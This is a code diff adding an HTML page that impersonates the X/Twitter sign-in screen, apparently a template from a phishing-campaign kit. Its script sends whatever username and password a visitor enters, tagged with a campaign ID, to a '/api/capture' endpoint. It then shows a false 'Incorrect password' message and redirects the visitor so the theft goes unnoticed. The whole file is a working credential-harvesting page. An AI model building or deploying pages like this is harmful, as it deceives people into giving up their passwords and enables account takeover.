@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X / Twitter - Log in</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #e7e9ea;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 20px;
+        }
+        .login-box {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 32px;
+        }
+        .logo { font-size: 2.5rem; margin-bottom: 32px; }
+        .login-box h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 28px;
+        }
+        .error-msg {
+            background: rgba(244, 33, 46, 0.15);
+            border: 1px solid rgba(244, 33, 46, 0.4);
+            color: #f4212e;
+            padding: 10px 14px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            margin-bottom: 16px;
+            display: none;
+        }
+        form { display: flex; flex-direction: column; gap: 16px; }
+        .input-field {
+            position: relative;
+            border: 1px solid #333;
+            border-radius: 4px;
+            background: transparent;
+            transition: border-color 0.2s;
+        }
+        .input-field:focus-within { border-color: #1d9bf0; }
+        .input-field label {
+            position: absolute;
+            top: 14px;
+            left: 12px;
+            color: #71767b;
+            font-size: 0.95rem;
+            transition: all 0.2s;
+            pointer-events: none;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 20px 12px 6px;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #e7e9ea;
+            font-size: 1rem;
+        }
+        .input-field input:focus + label,
+        .input-field input:not(:placeholder-shown) + label {
+            top: 6px;
+            font-size: 0.75rem;
+            color: #71767b;
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 28px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        button[type="submit"]:hover { background: #e6e9ea; }
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+        }
+        .forgot-link a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 600;
+            padding: 8px 16px;
+            border: 1px solid #536471;
+            border-radius: 28px;
+            display: inline-block;
+        }
+        .forgot-link a:hover { background: rgba(239,243,244,0.1); }
+        .signup-text {
+            margin-top: 40px;
+            color: #71767b;
+            font-size: 0.9rem;
+        }
+        .signup-text a { color: #1d9bf0; text-decoration: none; }
+        .signup-text a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">𝕏</div>
+            <h2>Sign in to X</h2>
+            <div class="error-msg" id="errorMsg">Incorrect password. Try again.</div>
+            <form id="loginForm">
+                <div class="input-field">
+                    <input type="text" id="username" name="username" placeholder=" " required autofocus>
+                    <label for="username">Phone, email, or username</label>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="password" name="password" placeholder=" " required>
+                    <label for="password">Password</label>
+                </div>
+                <button type="submit">Next</button>
+            </form>
+            <div class="forgot-link"><a href="#">Forgot password?</a></div>
+            <div class="signup-text">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = this.username.value;
+            const password = this.password.value;
+            const btn = this.querySelector('button[type="submit"]');
+            const error = document.getElementById('errorMsg');
+
+            btn.disabled = true;
+            btn.textContent = 'Signing in...';
+            error.style.display = 'none';
+
+            try {
+                const res = await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        campaignId: '{{CAMPAIGN_ID}}',
+                        username: username,
+                        password: password
+                    })
+                });
+
+                const data = await res.json();
+                await new Promise(r => setTimeout(r, 2000));
+
+                if (data.redirect) {
+                    error.style.display = 'block';
+                    btn.textContent = 'Redirecting...';
+                    setTimeout(() => { window.location.href = data.redirect; }, 2000);
+                }
+            } catch (err) {
+                btn.disabled = false;
+                btn.textContent = 'Next';
+                error.textContent = 'Something went wrong. Try again.';
+                error.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
